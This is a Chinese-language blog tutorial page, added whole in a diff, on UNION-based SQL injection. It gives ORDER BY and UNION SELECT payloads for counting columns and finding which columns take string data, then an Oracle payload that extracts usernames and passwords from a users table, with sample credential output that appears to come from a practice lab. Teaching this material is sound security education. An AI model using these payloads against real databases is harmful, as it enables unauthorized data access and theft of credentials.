@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Union注入 | All-on&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="确定所需列数
+有两种方式。一种是order by 3-- ：
+1&#39; ORDER BY 1-- 
+2&#39; ORDER BY 2-- 
+3&#39; ORDER BY 3-- 
+另一种是提交一系列指定不同数量空值的有效载荷：
+1&#39; UNION SELECT NULL-- 
+2&#39; UNION SELECT NULL,NULL-- 
+3&#39; UNION SELECT NULL,NULL,NULL-- 
+如果测试的列数大于实际列数，就会报错">
+<meta name="author" content="All-on">
+<link rel="canonical" href="https://all-on.github.io/posts/web/sql/union%E6%B3%A8%E5%85%A5/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.4f7a70c28f67918d50819ad94370c535de5b6f0d6c6299d10477402264aea5fd.css" integrity="sha256-T3pwwo9nkY1QgZrZQ3DFNd5bbw1sYpnRBHdAImSupf0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://all-on.github.io/images/site-icon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://all-on.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://all-on.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://all-on.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://all-on.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh-cn" href="https://all-on.github.io/posts/web/sql/union%E6%B3%A8%E5%85%A5/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" crossorigin="anonymous"><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js" crossorigin="anonymous"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js" crossorigin="anonymous"
+    onload="renderMathInElement(document.body, {
+        delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '\\[', right: '\\]', display: true},
+            {left: '\\(', right: '\\)', display: false},
+            {left: '$', right: '$', display: false}
+        ],
+        throwOnError: false,
+        ignoredTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+        ignoredClasses: ['entry-content']
+    });"></script>
+<meta property="og:url" content="https://all-on.github.io/posts/web/sql/union%E6%B3%A8%E5%85%A5/">
+  <meta property="og:site_name" content="All-on&#39;s Blog">
+  <meta property="og:title" content="Union注入">
+  <meta property="og:description" content="确定所需列数 有两种方式。一种是order by 3-- ：
+1&#39; ORDER BY 1-- 2&#39; ORDER BY 2-- 3&#39; ORDER BY 3-- 另一种是提交一系列指定不同数量空值的有效载荷：
+1&#39; UNION SELECT NULL-- 2&#39; UNION SELECT NULL,NULL-- 3&#39; UNION SELECT NULL,NULL,NULL-- 如果测试的列数大于实际列数，就会报错">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-11T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Union注入">
+  <meta name="twitter:description" content="确定所需列数 有两种方式。一种是order by 3-- ：
+1&#39; ORDER BY 1-- 2&#39; ORDER BY 2-- 3&#39; ORDER BY 3-- 另一种是提交一系列指定不同数量空值的有效载荷：
+1&#39; UNION SELECT NULL-- 2&#39; UNION SELECT NULL,NULL-- 3&#39; UNION SELECT NULL,NULL,NULL-- 如果测试的列数大于实际列数，就会报错">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://all-on.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Union注入",
+      "item": "https://all-on.github.io/posts/web/sql/union%E6%B3%A8%E5%85%A5/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Union注入",
+  "name": "Union注入",
+  "description": "确定所需列数 有两种方式。一种是order by 3-- ：\n1\u0026#39; ORDER BY 1-- 2\u0026#39; ORDER BY 2-- 3\u0026#39; ORDER BY 3-- 另一种是提交一系列指定不同数量空值的有效载荷：\n1\u0026#39; UNION SELECT NULL-- 2\u0026#39; UNION SELECT NULL,NULL-- 3\u0026#39; UNION SELECT NULL,NULL,NULL-- 如果测试的列数大于实际列数，就会报错\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "确定所需列数 有两种方式。一种是order by 3-- ：\n1' ORDER BY 1-- 2' ORDER BY 2-- 3' ORDER BY 3-- 另一种是提交一系列指定不同数量空值的有效载荷：\n1' UNION SELECT NULL-- 2' UNION SELECT NULL,NULL-- 3' UNION SELECT NULL,NULL,NULL-- 如果测试的列数大于实际列数，就会报错\n找出字符串数据匹配的列 想要检索的有趣数据通常是字符串形式。这意味着需要在原始查询结果中找到一个或多个列，其数据类型是字符串数据，或者与字符串数据兼容。 确定所需列数后，可以探测每个列是否能存储字符串数据。提交一系列负载，依次为每列放置字符串值。例如，如果查询返回四列，将提交：\n1' UNION SELECT 'a',NULL,NULL,NULL-- 2' UNION SELECT NULL,'a',NULL,NULL-- 3' UNION SELECT NULL,NULL,'a',NULL-- 4' UNION SELECT NULL,NULL,NULL,'a'-- 如果列数据类型与字符串数据不兼容，注入查询将引发数据库错误。\n一个字段检索出多个值 在某些情况下，前例中的查询可能只返回一列。例如，已知有两列，只有第二字段是字符串类型，这意味着第一列总是需要用空值来占位。所以不能像之前一样，直接在两列位置查询用户名和密码。 这时可以通过将多个值串接在一起，在这一列内检索多个值。添加分隔符来区分合并后的值。例如，在Oracle上提交以下输入：\n1' UNION SELECT username||'~'||password FROM users-- 这使用了 Oracle 上的字符串串接算子 double-pipe 序列||。注入查询将username和password字段的值串接在一起，中间用字符~分隔。 查询结果包含所有用户名和密码，例如：\n1... 2administrator~s3cure 3wiener~peter 4carlos~montoya 5... ",
+  "wordCount" : "517",
+  "inLanguage": "zh-cn",
+  "datePublished": "2026-05-11T00:00:00Z",
+  "dateModified": "2026-05-11T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "All-on"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://all-on.github.io/posts/web/sql/union%E6%B3%A8%E5%85%A5/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All-on's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://all-on.github.io/images/site-icon.jpg"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://all-on.github.io/" accesskey="h" title="All-on&#39;s Blog (Alt + H)">
+                <img src="https://all-on.github.io/images/site-icon.jpg" alt="" aria-label="logo"
+                    height="35">All-on&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="https://all-on.github.io/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://all-on.github.io/posts/" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://all-on.github.io/categories/" title="类别">
+                    <span>类别</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://all-on.github.io/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://all-on.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/posts/">Posts</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      Union注入
+      <span class="entry-hint" title="Draft">
+        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
+          <path
+            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
+        </svg>
+      </span>
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-05-11 00:00:00 +0000 UTC'>2026-05-11</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>517 words</span>&nbsp;·&nbsp;<span>All-on</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+<div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e7%a1%ae%e5%ae%9a%e6%89%80%e9%9c%80%e5%88%97%e6%95%b0" aria-label="确定所需列数">确定所需列数</a></li>
+                <li>
+                    <a href="#%e6%89%be%e5%87%ba%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%95%b0%e6%8d%ae%e5%8c%b9%e9%85%8d%e7%9a%84%e5%88%97" aria-label="找出字符串数据匹配的列">找出字符串数据匹配的列</a></li>
+                <li>
+                    <a href="#%e4%b8%80%e4%b8%aa%e5%ad%97%e6%ae%b5%e6%a3%80%e7%b4%a2%e5%87%ba%e5%a4%9a%e4%b8%aa%e5%80%bc" aria-label="一个字段检索出多个值">一个字段检索出多个值</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+         
+         activeElement = elements[0];
+         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+     }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        activeElement = Array.from(elements).find((element) => {
+            if ((getOffsetTop(element) - window.pageYOffset) > 0 &&
+                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                return element;
+            }
+        }) || activeElement
+
+        elements.forEach(element => {
+             const id = encodeURI(element.getAttribute('id')).toLowerCase();
+             if (element === activeElement){
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+             } else {
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+             }
+         })
+     }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;
+    }
+</script>
+
+  <div class="post-content md-content"><h2 id="确定所需列数">确定所需列数<a hidden class="anchor" aria-hidden="true" href="#确定所需列数">#</a></h2>
+<p>有两种方式。一种是<code>order by 3-- </code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; ORDER BY 1-- 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39; ORDER BY 2-- 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39; ORDER BY 3-- 
+</span></span></code></pre></div><p>另一种是提交一系列指定不同数量空值的有效载荷：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; UNION SELECT NULL-- 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39; UNION SELECT NULL,NULL-- 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39; UNION SELECT NULL,NULL,NULL-- 
+</span></span></code></pre></div><p>如果测试的列数大于实际列数，就会报错</p>
+<h2 id="找出字符串数据匹配的列">找出字符串数据匹配的列<a hidden class="anchor" aria-hidden="true" href="#找出字符串数据匹配的列">#</a></h2>
+<p>想要检索的有趣数据通常是字符串形式。这意味着需要在原始查询结果中找到一个或多个列，其数据类型是字符串数据，或者与字符串数据兼容。
+确定所需列数后，可以探测每个列是否能存储字符串数据。提交一系列负载，依次为每列放置字符串值。例如，如果查询返回四列，将提交：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; UNION SELECT &#39;a&#39;,NULL,NULL,NULL-- 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39; UNION SELECT NULL,&#39;a&#39;,NULL,NULL-- 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39; UNION SELECT NULL,NULL,&#39;a&#39;,NULL-- 
+</span></span><span class="line"><span class="ln">4</span><span class="cl">&#39; UNION SELECT NULL,NULL,NULL,&#39;a&#39;-- 
+</span></span></code></pre></div><p>如果列数据类型与字符串数据不兼容，注入查询将引发数据库错误。</p>
+<h2 id="一个字段检索出多个值">一个字段检索出多个值<a hidden class="anchor" aria-hidden="true" href="#一个字段检索出多个值">#</a></h2>
+<p>在某些情况下，前例中的查询可能只返回一列。例如，已知有两列，只有第二字段是字符串类型，这意味着第一列总是需要用空值来占位。所以不能像之前一样，直接在两列位置查询用户名和密码。
+这时可以通过将多个值串接在一起，在这一列内检索多个值。添加分隔符来区分合并后的值。例如，在Oracle上提交以下输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; UNION SELECT username||&#39;~&#39;||password FROM users-- 
+</span></span></code></pre></div><p>这使用了 Oracle 上的字符串串接算子 double-pipe 序列<code>||</code>。注入查询将<code>username</code>和<code>password</code>字段的值串接在一起，中间用字符<code>~</code>分隔。
+查询结果包含所有用户名和密码，例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">... 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">administrator~s3cure 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">wiener~peter 
+</span></span><span class="line"><span class="ln">4</span><span class="cl">carlos~montoya 
+</span></span><span class="line"><span class="ln">5</span><span class="cl">...
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://all-on.github.io/posts/web/sql/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/">
+    <span class="title">« </span>
+    <span>SQL注入速查表</span>
+  </a>
+  <a class="next" href="https://all-on.github.io/posts/web/csrf/">
+    <span class="title"> »</span>
+    <span>CSRF</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://all-on.github.io/">All-on&#39;s Blog</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
